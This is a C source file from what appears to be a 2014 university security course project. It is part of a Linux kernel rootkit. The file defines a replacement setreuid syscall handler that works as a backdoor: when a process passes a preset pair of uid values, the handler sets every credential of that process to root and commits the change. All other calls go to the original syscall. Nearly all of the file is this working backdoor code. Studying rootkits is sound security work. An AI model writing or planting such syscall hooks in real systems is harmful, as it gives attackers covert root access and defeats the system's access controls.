/**********************************************************
	Last Updated: Nov 1, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Functions related to hijack a 'setreuid' system call
***********************************************************/

#include "../headers/all.h"
#include "../headers/backdoor.h"

EXPORT_SYMBOL(my_setreuid);
extern asmlinkage long (*original_setreuid)(uid_t, uid_t);

/* BACKDOOR by Koo: 
 *
 * If a certain set of (ruid/euid) is configured to a normal program with a user privilege, 
 * it will obtain a root privilege with this backdoor at once
 *
 * */
asmlinkage long
my_setreuid(uid_t ruid, uid_t euid) {
	// Hooking a certain condition below
	if( (ruid == BACKDOOR_RUID) && (euid == BACKDOOR_EUID) ) {
		struct cred *credential = prepare_creds();

		// Set the permission of the current process to root
		credential -> uid = 0;
		credential -> gid = 0;
		credential -> euid = 0;
		credential -> egid = 0;
		credential -> suid = 0;
		credential -> sgid = 0;
		credential -> fsuid = 0;
		credential -> fsgid = 0;
		
		return commit_creds(credential);
	}
	
	// Otherwise just call original function
	return original_setreuid(ruid, euid);
}
